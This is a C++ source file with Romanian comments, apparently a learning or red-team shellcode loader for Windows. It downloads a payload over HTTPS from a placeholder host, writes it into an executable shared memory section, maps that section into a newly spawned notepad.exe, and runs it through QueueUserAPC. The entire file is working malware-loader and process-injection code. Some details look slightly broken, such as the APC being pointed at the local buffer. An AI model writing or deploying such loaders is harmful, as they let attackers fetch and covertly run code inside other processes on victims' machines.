#include <iostream>
#include <vector>
#include <Windows.h>
#include <stdio.h>
#include <winhttp.h>
#include "addons.h"
#pragma comment(lib, "winhttp.lib")
#pragma warning(disable:4996)

void print_last_error() {
    DWORD errCode = GetLastError();
    LPTSTR errorText = NULL;

    FormatMessage(
        FORMAT_MESSAGE_FROM_SYSTEM
        | FORMAT_MESSAGE_ALLOCATE_BUFFER
        | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&errorText,
        0,
        NULL);

    if (NULL != errorText)
    {
        LocalFree(errorText);
        errorText = NULL;
    }
}

std::vector<BYTE> download_payload(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

PPROCESS_INFORMATION create_taget_process(wchar_t cmd[]) {
    LPSTARTUPINFOW       si;
    PPROCESS_INFORMATION pi; // ATENTIE: doi P
    BOOL                 success;

    si = new STARTUPINFOW();
    si->cb = sizeof(LPSTARTUPINFOW);

    pi = new PROCESS_INFORMATION(); // ATENTIE: un P

    success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE, // daca handle-ul va fi mostenit de la procesul parinte
        0,
        NULL,
        NULL,
        si, // pointer la STARTUPINFO sau STARTUPINFOEX - necesar
        pi); // pointer la PROCESS_INFORMATION - necesar

    if (!success) {
        printf("[x] CreateProcess failed.");
        return NULL;
    }

    printf("dwProcessId : %d\n", pi->dwProcessId); // afisam process ID-ul
    printf("dwThreadId  : %d\n", pi->dwThreadId); // afisam thread ID-ul
    printf("hProcess    : %p\n", pi->hProcess); // afisam adresa procesului
    printf("hThread     : %p\n", pi->hThread); // afisam adresa thread-ului

    return pi;
}

int main()
{
    // vom descarca shellcode-ul in aceasta var
    std::vector<BYTE> shellcode = download_payload(L"bank.com\0", L"/download/file.ext\0");

    if (shellcode.size() <= 0)
    {
        std::cout << "Payload-ul are dimensiunea 0 - eroare" << std::endl;
        system("pause");
        return 1;
    }

    // importam functiile
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // sectiunea care va retine HANDLE-ul
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    // creem sectiunea
    NTSTATUS status = ntCreateSection(
        &hSection, // handle-ul sectiunii
        SECTION_ALL_ACCESS,
        NULL,
        &szSection, // marimea sectiunii create
        PAGE_EXECUTE_READWRITE, // permisiuni - RWX
        SEC_COMMIT, // pornim atributul commit
        NULL);

    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    std::cout << "ID-ul procesului este: " << GetCurrentProcessId() << std::endl;
    system("pause");

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(), // specificam handle-ul procesului curent
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    PVOID hRemoteAddress = NULL; // adresa preluata de sectiune, in cadrul procesului tinta
    wchar_t cmd[] = L"notepad.exe\0";
    PPROCESS_INFORMATION process_info = create_taget_process(cmd);

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess, // specificam handle-ul procesului tinta
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    QueueUserAPC(
        (PAPCFUNC)&shellcode[0], // pointer catre functia executata ca shellcode
        process_info->hThread, // handle-ul thread-ului
        0
    );

    ResumeThread(process_info->hThread);

    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);

    CloseHandle(process_info->hThread); // inchidem thread-ul
    CloseHandle(process_info->hProcess); // inchidem procesul
}